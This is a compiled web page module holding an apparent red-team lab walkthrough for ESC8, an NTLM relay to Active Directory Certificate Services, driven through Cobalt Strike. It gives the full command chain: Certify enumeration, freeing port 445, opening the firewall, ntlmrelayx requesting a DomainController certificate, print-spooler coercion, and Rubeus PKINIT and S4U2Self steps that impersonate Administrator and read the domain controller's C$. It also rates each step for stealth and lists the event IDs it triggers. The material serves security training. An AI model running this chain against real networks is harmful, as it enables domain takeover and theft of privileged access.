import{_ as t,o as a,c as o,am as s}from"./chunks/framework.yj4qiWdr.js";const u=JSON.parse('{"title":"ESC8 NTLM Relay to ADCS HTTP Endpoints","description":"","frontmatter":{"pageClass":"crto-page"},"headers":[],"relativePath":"crto/botesjuan/labs/esc8.md","filePath":"crto/botesjuan/labs/esc8.md"}'),i={name:"crto/botesjuan/labs/esc8.md"};function n(l,e,r,c,p,d){return a(),o("div",null,e[0]||(e[0]=[s('<h1 id="esc8-ntlm-relay-to-adcs-http-endpoints" tabindex="-1">ESC8 NTLM Relay to ADCS HTTP Endpoints <a class="header-anchor" href="#esc8-ntlm-relay-to-adcs-http-endpoints" aria-label="Permalink to &quot;ESC8 NTLM Relay to ADCS HTTP Endpoints&quot;">​</a></h1><blockquote><p>The objective of this lab is to identify and exploit ESC8.</p></blockquote><hr><h2 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h2><ol><li><p>Launch Cobalt Strike and connect to the team server.</p></li><li><p>Enumerate the certificate authority for vulnerabilities. 🔍</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet</span></span></code></pre></div></li></ol><p>⚠️ This will show that <em>lon-cs-1</em> is vulnerable to ESC8.</p><hr><h2 id="relay-setup" tabindex="-1">Relay Setup <a class="header-anchor" href="#relay-setup" aria-label="Permalink to &quot;Relay Setup&quot;">​</a></h2><ol><li><p>Use Beacon to start a SOCKS proxy.</p><ol><li><code>socks 1080 socks5</code></li></ol></li><li><p>Run <code>netstat</code> to see that port 445 is currently bound.</p></li><li><p>Set the <em>lanmanserver</em> service&#39;s start mode to <em>disabled</em> to prevent it from automatically restarting.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>sc_config lanmanserver &quot;C:\\Windows\\system32\\svchost.exe -k netsvcs -p&quot; 1 4</span></span></code></pre></div></li><li><p>Stop these services in the following order to unbind port 445.</p><ol><li><code>sc_stop lanmanserver</code></li><li><code>sc_stop srv2</code></li><li><code>sc_stop srvnet</code></li></ol></li></ol><p>⚠️ Run <code>netstat</code> and verify that 445 is no longer bound.</p><ol start="5"><li>Start a reverse port forward that will bind to port 445 and redirect the traffic to <em>127.0.0.1:7445</em> on the attacker desktop. <ol><li><code>rportfwd_local 445 localhost 7445</code></li></ol></li></ol><p>⚠️ <code>netstat</code> will show 445 being bound again, but the PID will be that of the Beacon.</p><ol start="6"><li><p>Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation. Add the rule:</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick New-NetFirewallRule -DisplayName &quot;File Sharing&quot; -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445</span></span></code></pre></div></li></ol><hr><h2 id="relaying" tabindex="-1">Relaying <a class="header-anchor" href="#relaying" aria-label="Permalink to &quot;Relaying&quot;">​</a></h2><ol><li><p>On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.</p><ol><li><code>docker container start -i kali-1</code></li></ol></li><li><p>Configure proxychains to use Cobalt&#39;s SOCKS proxy.</p><ol><li>Open <code>/etc/proxychains.conf</code> in vim or nano.</li><li>Scroll to the last line.</li><li>Replace the default socks4 entry 💡 <code>socks5 10.0.0.5 1080</code>💡</li><li>Save the changes.</li></ol></li><li><p>Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint. We&#39;re going to relay the credentials of a domain controller, so we&#39;ll specifically request a <em>DomainController</em> certificate.🕵️ Still in the kali linux Docker instance start <code>NTLMRelayX</code></p><div class="language-bash vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#FFA657;">proxychains</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> impacket-ntlmrelayx</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> http://10.10.120.5/certsrv/certfnsh.asp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> -smb2support</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> --adcs</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> --template</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;"> DomainController</span></span></code></pre></div></li><li><p>While that is waiting, go back to Beacon.</p></li><li><p>Coerce the domain controller into authenticating to the current machine.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108</span></span></code></pre></div></li></ol><p>⚠️ The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy. A file called <strong>LON-DC-1.pfx</strong> should be created.</p><ol start="6"><li>Press Ctrl+C to stop ntlmrelayx.</li></ol><hr><h2 id="post-exploitation-—-lon-dc-1-pfx-→-domain-administrator" tabindex="-1">Post-Exploitation — LON-DC-1.pfx → Domain Administrator <a class="header-anchor" href="#post-exploitation-—-lon-dc-1-pfx-→-domain-administrator" aria-label="Permalink to &quot;Post-Exploitation — LON-DC-1.pfx → Domain Administrator&quot;">​</a></h2><blockquote><p><strong>Perform these steps before Cleanup</strong> while the SOCKS proxy is still active. The PFX is on the Kali Docker container. Two paths are documented: Kali Docker (PKINITtools/Certipy — no PFX transfer needed) and Windows Beacon (Rubeus — requires PFX transfer).</p></blockquote><h3 id="path-—-windows-beacon-rubeus-—-cs-native" tabindex="-1">Path — Windows Beacon (Rubeus — CS-native) <a class="header-anchor" href="#path-—-windows-beacon-rubeus-—-cs-native" aria-label="Permalink to &quot;Path — Windows Beacon (Rubeus — CS-native)&quot;">​</a></h3><h4 id="step-1-—-copy-certificate-base64-encode-pfx-on-attacker-desktop" tabindex="-1">Step 1 — Copy certificate &amp; Base64 encode PFX on attacker desktop <a class="header-anchor" href="#step-1-—-copy-certificate-base64-encode-pfx-on-attacker-desktop" aria-label="Permalink to &quot;Step 1 — Copy certificate &amp; Base64 encode PFX on attacker desktop&quot;">​</a></h4><p>search Inside the kali container</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>find / -name &quot;LON-DC-1.pfx&quot; 2&gt;/dev/null</span></span></code></pre></div><p>Copy certificate back to windows from docker kali image:</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>docker cp kali-1:/LON-DC-1.pfx C:\\Tools\\LON-DC-1.pfx</span></span></code></pre></div><p>Run in PowerShell on the attacker desktop:</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ToBase64String([</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ReadAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Tools\\LON-DC-1.pfx&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><p>Copy the full output string.</p><h4 id="step-2-—-request-tgt-for-dc-machine-account-via-pkinit" tabindex="-1">Step 2 — Request TGT for DC machine account via PKINIT <a class="header-anchor" href="#step-2-—-request-tgt-for-dc-machine-account-via-pkinit" aria-label="Permalink to &quot;Step 2 — Request TGT for DC machine account via PKINIT&quot;">​</a></h4><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:&lt;base64_pfx_string&gt; /enctype:aes256 /nowrap</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE (no disk write on target)</strong> — Certificate is passed in-memory as a Rubeus argument; nothing written to the target filesystem. <code>execute-assembly</code> still spawns a sacrificial process (CAUTION tier). PKINIT AS-REQ generates <strong>Event 4768</strong> on DC. Note the base64 TGT from output.</p></blockquote><h4 id="step-3-—-s4u2self-to-impersonate-administrator" tabindex="-1">Step 3 — S4U2Self to impersonate Administrator <a class="header-anchor" href="#step-3-—-s4u2self-to-impersonate-administrator" aria-label="Permalink to &quot;Step 3 — S4U2Self to impersonate Administrator&quot;">​</a></h4><p>Use the DC machine account TGT to perform S4U2Self, requesting a CIFS service ticket as Administrator to the DC. The <code>/self</code> flag specifies S4U2Self (no S4U2Proxy required — DC machine account is trusted for delegation to itself).</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> — Generates <strong>Event 4769</strong> (TGS-REQ S4U2Self) on DC. <code>/ptt</code> injects the resulting service ticket into the beacon&#39;s logon session in-memory — no disk write.</p></blockquote><h4 id="step-4-—-prove-da-access" tabindex="-1">Step 4 — Prove DA Access <a class="header-anchor" href="#step-4-—-prove-da-access" aria-label="Permalink to &quot;Step 4 — Prove DA Access&quot;">​</a></h4><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ls \\\\lon-dc-1.contoso.com\\C$</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — SMB access via injected Kerberos ticket. Generates <strong>Event 4624 Type 3</strong> on DC only. No remote process spawn, no service creation.</p></blockquote><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>download \\\\lon-dc-1.contoso.com\\C$\\Users\\Administrator\\Desktop\\root.txt</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> — File read over existing beacon C2 channel. Generates <strong>Event 4663</strong> on DC if Object Access auditing is enabled.</p></blockquote><hr><h3 id="esc8-full-chain-opsec-summary" tabindex="-1">ESC8 Full Chain OPSEC Summary <a class="header-anchor" href="#esc8-full-chain-opsec-summary" aria-label="Permalink to &quot;ESC8 Full Chain OPSEC Summary&quot;">​</a></h3><table tabindex="0"><thead><tr><th>Stage</th><th>Action</th><th>OPSEC</th><th>Key Events</th></tr></thead><tbody><tr><td>Enum</td><td>Certify enum-cas</td><td>OPSEC-🟠CAUTION</td><td>LDAP to DC (1644)</td></tr><tr><td>Relay setup</td><td>Stop lanmanserver / rportfwd</td><td>OPSEC-🟠CAUTION</td><td>Service control events (7036)</td></tr><tr><td>Coerce</td><td>SharpSpoolTrigger</td><td>OPSEC-🔴UNSAFE</td><td>Print spooler RPC — Event 4624 on target</td></tr><tr><td>Relay</td><td>ntlmrelayx → ADCS</td><td>OPSEC-🟠CAUTION</td><td>CA Events 4886/4887 — always logged</td></tr><tr><td>Prove DA</td><td>smbclient / ls C$</td><td>OPSEC-🟢SAFE</td><td>Event 4624 Type 3 on DC</td></tr><tr><td>Cleanup</td><td>Restore services / firewall</td><td>OPSEC-🟢SAFE</td><td>Reduces forensic footprint</td></tr></tbody></table><h2 id="cleanup" tabindex="-1">Cleanup <a class="header-anchor" href="#cleanup" aria-label="Permalink to &quot;Cleanup&quot;">​</a></h2><ol><li><p>Stop the SOCKS proxy.</p><ol><li><code>socks stop</code></li></ol></li><li><p>Stop the reverse port forward.</p><ol><li><code>rportfwd stop 445</code></li></ol></li><li><p>Restore the services back to default.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>sc_config lanmanserver &quot;C:\\Windows\\system32\\svchost.exe -k netsvcs -p&quot; 1 2</span></span></code></pre></div><ol><li><code>sc_start srvnet</code></li><li><code>sc_start srv2</code></li><li><code>sc_start lanmanserver</code></li></ol></li><li><p>Remove the firewall rule.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick Remove-NetFirewallRule -DisplayName &quot;File Sharing&quot;</span></span></code></pre></div></li></ol><p>⚠️ This lab, you have learned how to identify and exploit ESC8 through a C2.</p>',48)]))}const g=t(i,[["render",n]]);export{u as __pageData,g as default};
